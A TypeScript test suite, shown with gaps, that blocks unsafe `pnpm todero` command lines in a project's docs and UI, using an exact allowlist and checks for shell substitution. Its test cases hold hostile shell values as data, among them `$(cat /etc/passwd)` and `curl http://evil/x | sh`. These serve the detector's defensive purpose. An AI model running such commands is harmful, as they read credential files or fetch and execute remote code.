...
// The Todero CLI is unsafe when an operator or an agent runs it through
// `pnpm todero <sub> <arg>` with a content-bearing argument. `pnpm` treats
// `todero` as a `package.json` script. It appends the argument to a
...
// expansion (`$NAME`) before the CLI starts. `npx todero` runs the CLI
// binary directly. It passes the argument as an inert argv value and does not
// run a shell over the value. `npx todero` is the safe form.
//
// `pnpm exec todero` is not a safe substitute. The root workspace does not
// depend on the `todero` package, so `pnpm` never links its binary into
...
//
// This guard is fail-closed against an exact allowlist. A `pnpm todero`
...
// take no value. Every other `pnpm todero` line is an offender and must use
// `npx todero` (or the direct-exec form for local source).
...
// ── The exact allowlist ───────────────────────────────────────────────────
//
// Each entry is a fully literal command string. A `pnpm todero` line is
...
const PNPM_ALLOWLIST = new Set<string>([
  ...
  "pnpm todero plugin list",
  "pnpm todero feedback report",
  "pnpm todero feedback report --payloads",
  "pnpm todero feedback export",
  "pnpm todero instance settings:experimental",
  "pnpm todero worktree ensure-seeded",
...
//
// A policy or warning sentence names `pnpm todero` on purpose to tell the
...
const DOC_PHRASES = new Set<string>([
  // A bare mention such as `` `pnpm todero` `` inside prose.
  "pnpm todero",
  // The abstract command form the policy section discusses.
  "pnpm todero <command> <args>",
]);

// ── Command extraction ────────────────────────────────────────────────────
//
// Extract the full logical command that a reader runs from a `pnpm todero`
...
// line such as `pnpm todero run "$(cat secret)"` would truncate to the
// allowlisted `pnpm todero run` and pass, while the copied command still
...
//    `["pnpm todero run", tail].join("")` extracts the allowlisted prefix
...
// a truncation boundary, so a line such as `pnpm todero run "$(cat secret)"`
...
// A `pnpm todero` occurrence is an offender when it is wrapped in a
...
// catches `$(pnpm todero ...)`, which normalizes the dangerous habit of
...
// checks each physical line alone, a `pnpm todero` command whose unsafe
...
// A line that recommends the broken `pnpm exec todero` form. A warning line
...
function recommendsBrokenExecForm(line: string): boolean {
  if (!line.includes("pnpm exec todero")) return false;
...
describe("todero CLI invocation safety", () => {
  it("allows only exact-allowlist pnpm todero commands on every guidance surface", () => {
    const offenders = scanForOffenders();
    expect(
      offenders,
      `Each pnpm todero line must match an exact allowlist entry, else use ` +
        `npx todero (or the direct-exec form for local source):\n${offenders.join("\n")}`,
    ).toEqual([]);
  });

  it("never recommends the broken pnpm exec todero form", () => {
    const offenders = scanForBrokenExecForm();
    expect(
      offenders,
      `\`pnpm exec todero\` does not resolve the CLI binary; use \`npx todero\`:\n${offenders.join("\n")}`,
    ).toEqual([]);
  });
  ...
  // `npx todero`. So it missed `--config`, `--data-dir`, `--instance`,
  ...
  it("flags a value-bearing option that the old flag list omitted", () => {
    ...
    expect(scanText("doc/E.md", "pnpm todero doctor --config ./scratch.json")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm todero run --data-dir ./tmp/dev")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm todero run --instance dev")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm todero run --bind tailnet")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm todero onboard --yes --bind lan")).toHaveLength(1);
  });

  it("flags a context-profile value and every worktree path/ref/id/name option", () => {
    expect(scanText("doc/E.md", "pnpm todero context use default")).toHaveLength(1);
    // Path, ref, id, and name options on worktree commands.
    expect(scanText("doc/E.md", "pnpm todero worktree repair --branch PAP-1-x")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm todero worktree:make my-feature --start-point origin/main")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm todero worktree init --from-config ~/.todero/config.json")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm todero worktree reseed --to PAP-1-x")).toHaveLength(1);
  });
  ...
  it("does not let an npx mention on the same line suppress detection", () => {
    ...
    const mixed = "Prefer npx todero, but pnpm todero issue create --title x also works.";
  ...
  it("rejects a command-substitution or variable span in a recommended command", () => {
    ...
    expect(scanText("doc/E.md", "pnpm todero allowed-hostname `hostname`")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm todero issue create --title $(cat /etc/passwd)")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm todero run --instance $INSTANCE")).toHaveLength(1);
    // A literal command wrapped in $( ) is still an offender.
    expect(scanText("doc/E.md", 'eval "$(pnpm todero worktree env)"')).toHaveLength(1);
  });
  ...
  it("flags an allowlisted prefix followed by a quoted or backtick suffix", () => {
    ...
    expect(scanText("doc/E.md", 'pnpm todero run "$(cat /etc/passwd)"')).toHaveLength(1);
    expect(scanText("doc/E.md", 'pnpm todero doctor "$HOME/scratch.json"')).toHaveLength(1);
    // (b) A backtick-delimited suffix after the allowlisted command.
    expect(scanText("doc/E.md", "pnpm todero run `hostname`")).toHaveLength(1);
    // A single-quoted suffix is also part of the full command.
    expect(scanText("doc/E.md", "pnpm todero onboard 'extra value'")).toHaveLength(1);
  });
  ...
  // extracted only `pnpm todero run` (or `... doctor`) and reported zero
  ...
  it("fails closed on a leading unmatched double quote before the marker", () => {
    ...
    // extracted `pnpm todero run` and reported zero offenders (fail open).
    const line = 'some prose with one " quote then pnpm todero run "$(dangerous)"';
    expect(scanText("doc/E.md", line)).toHaveLength(1);
    // The same shape with a doctor prefix and a `$VAR` suffix.
    const varLine = 'a stray " quote and pnpm todero doctor "$HOME/x"';
  ...
  it("fails closed on a leading unmatched backtick and on mixed delimiters", () => {
    ...
    // the guard extracted `pnpm todero run` and reported zero offenders.
    const backtick = "a stray ` tick then pnpm todero run `hostname`";
    expect(scanText("doc/E.md", backtick)).toHaveLength(1);
    // Mixed: a leading unmatched backtick, then a double-quoted `$( )` suffix.
    const mixedA = 'a stray ` tick then pnpm todero run "$(cat secret)"';
    expect(scanText("doc/E.md", mixedA)).toHaveLength(1);
    // Mixed: a leading unmatched double quote, then a backtick suffix.
    const mixedB = 'a stray " quote then pnpm todero run `hostname`';
  ...
  it("does not let an escaped delimiter before the marker open a span", () => {
    ...
    const escapedQuote = 'a label \\" then pnpm todero run "$(dangerous)"';
    expect(scanText("doc/E.md", escapedQuote)).toHaveLength(1);
    const escapedTick = "a label \\` then pnpm todero run `hostname`";
    ...
    const adjacentEscaped = '\\"pnpm todero run "$(dangerous)"';
  ...
  it("still trusts a span in its proven literal context", () => {
    ...
    expect(scanText("doc/E.md", "Run `pnpm todero run` to start.")).toEqual([]);
    expect(scanText("config/example.ts", '  command: "pnpm todero onboard --yes --run",')).toEqual([]);
    expect(scanText("doc/E.md", "Run `$ pnpm todero doctor` to check.")).toEqual([]);
  });
  ...
  it("fails closed on a shell eval that concatenates a quoted form with a substitution", () => {
    ...
    const shell = 'eval "pnpm todero run"$(curl http://evil/x | sh)';
  ...
  it("fails closed on a quoted residual in a Markdown line", () => {
    ...
    const md = 'Run "pnpm todero run"$(cat /etc/passwd) to start.';
  ...
  it("fails closed on a TypeScript quote span that a concatenation or a substitution follows", () => {
    ...
    const concat = 'const cmd = "pnpm todero run" + userInput;';
    expect(scanText("src/build-cmd.ts", concat)).toHaveLength(1);
    const substitution = 'const cmd = "pnpm todero run"$(inject);';
  ...
  it("fails closed on an allowlisted prefix joined with a tail in an array literal", () => {
    ...
    const source =
      'const command = ["pnpm todero run", userControlledTail].join("");';
  ...
  it("fails closed on an allowlisted prefix passed as a call argument with a tail", () => {
    ...
    const source = 'const command = buildCommand("pnpm todero run", tail);';
    const offenders = scanText("src/build-command.ts", source);
    expect(offenders).toHaveLength(1);
  });
  ...
  it("flags an allowlisted prefix with a backtick suffix on a continued line", () => {
    ...
    const quoted = ["pnpm todero doctor \\", '  --config "$(cat secret)"'].join("\n");
    expect(scanText("doc/EXAMPLE.md", quoted)).toHaveLength(1);
    const backtick = ["pnpm todero run \\", "  `hostname`"].join("\n");
  ...
  it("allows an exact allowlist entry and a bare documentation mention", () => {
    expect(scanText("doc/E.md", "pnpm todero run")).toEqual([]);
    expect(scanText("doc/E.md", "pnpm todero worktree env --json")).toEqual([]);
    expect(scanText("doc/E.md", "pnpm todero configure --section server")).toEqual([]);
    // A prose mention inside backticks is not a runnable command.
    expect(scanText("doc/E.md", "Do not use `pnpm todero` for a content-bearing argument.")).toEqual([]);
    expect(scanText("doc/E.md", "The `pnpm todero <command> <args>` form is unsafe.")).toEqual([]);
  });
  ...
  it("emits a static, non-interpolated safe form from the private-hostname guard messages", () => {
    ...
    expect(source).toContain("run npx todero allowed-hostname <host>");
    expect(source).not.toContain("allowed-hostname ${hostname}");
    expect(source).not.toContain("pnpm todero allowed-hostname");
    expect(source).not.toContain("pnpm exec todero allowed-hostname");
  });
  ...
  it("emits a static, non-interpolated safe form from the onboarding access diagnostics", () => {
    ...
    expect(source).not.toMatch(/pnpm todero allowed-hostname/);
    expect(source).not.toContain("pnpm exec todero allowed-hostname");
    expect(source).toContain("npx todero allowed-hostname <host>");
  ...
  it("emits the safe form in the generated company-export README", () => {
    ...
    expect(readme).toContain("npx todero company import this-github-url-or-folder");
    expect(readme).not.toContain("pnpm todero company import");
    expect(readme).not.toContain("pnpm exec todero company import");
  });

  it("emits the safe form in the company-export preview builder", () => {
    const source = read("ui/src/pages/CompanyExport.tsx");
    expect(source).not.toContain("pnpm todero company import");
    expect(source).not.toContain("pnpm exec todero company import");
    expect(source).toContain("npx todero company import");
  });
  ...
  // `pnpm todero` script resolves only inside a checkout, so each surface
  // must pin the `npx todero` form. The client connection-error hint also
  ...
  it("emits the onboard hint from the server startup banner", () => {
    ...
    expect(source).toContain("npx todero onboard");
    expect(source).not.toContain("pnpm todero onboard");
    expect(source).not.toContain("pnpm exec todero onboard");
  });

  it("emits the safe run form from the client connection-error hint", () => {
    const source = read("cli/src/client/http.ts");
    expect(source).toContain("npx todero run");
    expect(source).not.toContain("pnpm todero run");
  });
  ...
  it("emits the checked-out CLI cleanup form from the env-lab status output", () => {
    ...
    // The bare `pnpm todero` script form is unsafe. Do not restore it.
    expect(source).not.toContain("pnpm todero env-lab");
    // `pnpm exec todero` does not resolve the CLI binary. Do not use it.
    expect(source).not.toContain("pnpm exec todero env-lab");
  ...
  it("emits the bootstrap fallback command from the UI", () => {
    ...
    expect(source).toContain("npx todero auth bootstrap-ceo");
    expect(source).not.toContain("pnpm todero auth bootstrap-ceo");
    expect(source).not.toContain("pnpm exec todero auth bootstrap-ceo");
  });

  it("emits the setup form from the board skill", () => {
    const source = read("skills/todero-board/SKILL.md");
    expect(source).toContain("npx todero board setup");
    expect(source).not.toContain("pnpm todero board setup");
    expect(source).not.toContain("pnpm exec todero board setup");
  });
  ...
  it("documents the safe form in doc/CLI.md", () => {
    ...
    expect(cli).toContain("npx todero");
  ...
  it("documents offline and air-gapped use with a safe cache-only form", () => {
    ...
    expect(subsection).toContain("npx --offline todero");
    // The offline subsection must not present `pnpm todero` or
    // `pnpm exec todero` as a safe or offline form. Only a warning line
    // may name `pnpm todero`, and it must tell the reader not to use it.
    for (const line of subsection.split("\n")) {
      expect(line).not.toContain("pnpm exec todero");
      if (line.includes("pnpm todero")) {
  ...
  it("documents the safe form in the agent-facing skill", () => {
    const skill = read("skills/todero/SKILL.md");
    expect(skill).toContain("CLI safety");
    expect(skill).toContain("npx todero");
    expect(skill).toContain("Do not use `pnpm todero`");
  });

  // ── Backslash line continuation ──────────────────────────────────────────

  it("flags a content-bearing pnpm todero command split across continued lines", () => {
    const source = [
      "```sh",
      "pnpm todero issue create \\",
  ...
  it("does not flag a continued npx todero command", () => {
    const source = [
      "npx todero issue create \\",
      "  --company-id <company-id> \\",
  ...
  it("does not flag a continued pnpm todero command that stays on the allowlist", () => {
    const source = [
      "pnpm todero env-lab \\",
      "  status \\",
      "  --json",
  ...
  it("flags a recommended pnpm exec todero line but skips a warning line", () => {
    expect(recommendsBrokenExecForm("Run pnpm exec todero issue create --title x")).toBe(true);
    expect(
      recommendsBrokenExecForm("`pnpm exec todero <command> <args>` — broken. Do not use it."),
    ).toBe(false);
  });
});
